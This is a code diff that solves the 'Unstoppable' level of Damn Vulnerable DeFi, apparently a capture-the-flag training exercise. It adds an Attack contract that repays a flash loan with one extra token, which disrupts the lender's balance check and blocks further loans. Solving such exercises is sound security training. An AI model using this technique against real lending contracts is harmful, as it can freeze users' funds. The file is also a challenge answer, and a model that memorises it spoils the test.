@@ -7,6 +7,27 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+interface IReceiver {
+    function receiveTokens(address tokenAddress, uint256 amount) external;
+}
+
+contract Attack {
+    UnstoppableLender private _unstoppableLender;
+
+    constructor(UnstoppableLender unstoppableLender) {
+        _unstoppableLender = unstoppableLender;
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        _unstoppableLender.flashLoan(amount);
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        IERC20(tokenAddress).transfer(msg.sender, amount + 1);
+    }
+}
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -60,6 +81,10 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Attack attack = new Attack(unstoppableLender);
+        dvt.transfer(address(attack), INITIAL_ATTACKER_TOKEN_BALANCE);
+        attack.executeFlashLoan(10);
         /**
          * EXPLOIT END *
          */
